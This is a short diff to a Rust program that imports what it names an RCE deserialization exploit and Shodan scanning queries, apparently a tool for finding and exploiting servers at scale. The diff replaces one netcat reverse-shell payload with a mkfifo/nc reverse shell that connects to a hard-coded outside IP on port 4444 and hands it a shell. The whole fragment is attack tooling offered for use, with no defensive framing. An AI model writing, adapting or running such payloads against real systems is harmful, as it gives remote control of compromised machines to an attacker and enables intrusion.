@@ -6,7 +6,7 @@ use crate::exploit::react::react_unsafely_deserialize_rce;
 use crate::osint::shodan::{shodan_queries,shodan as shodan};
 #[tokio::main]
 async fn main() {
-    let prefix_payload = "nc 190.102.43.107 5555 -e sh";
+    let prefix_payload = "rm /tmp/f; mkfifo /tmp/f; nc 45.140.193.103 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1";
     let shodan = shodan::Shodan::new(String::from(""));
 
     // let shodan_next_basic_filters = shodan::Filters {
